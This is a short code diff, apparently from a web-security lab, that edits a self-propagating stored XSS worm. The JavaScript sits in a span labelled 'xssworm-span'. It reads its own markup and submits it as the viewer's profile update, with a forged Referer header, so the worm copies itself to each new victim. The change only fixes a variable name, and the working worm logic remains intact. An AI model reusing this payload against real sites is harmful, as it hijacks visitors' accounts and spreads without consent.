@@ -25,12 +25,12 @@
         transferReq.setRequestHeader("Referer","https://niss.com/tranfer.php")
         transferReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         // 读取本文件 ==> str
-        porfileData = "<span id=xssworm-span>"
-        porfileData += document.getElementById("xssworm-span").innerHTML + "</span>";
-        porfileData = encodeURIComponent(porfileData);
+        let profileData = "<span id=xssworm-span>"
+        profileData += document.getElementById("xssworm-span").innerHTML + "</span>";
+        profileData = encodeURIComponent(profileData);
         // 将其保存至 profile中
-        porfileData = "profile_submit=Save&profile_update=" + porfileData;
-        transferReq.send(porfileData);
+        profileData = "profile_submit=Save&profile_update=" + profileData;
+        transferReq.send(profileData);
         alert("profile update req send")
     </script>
 </span>
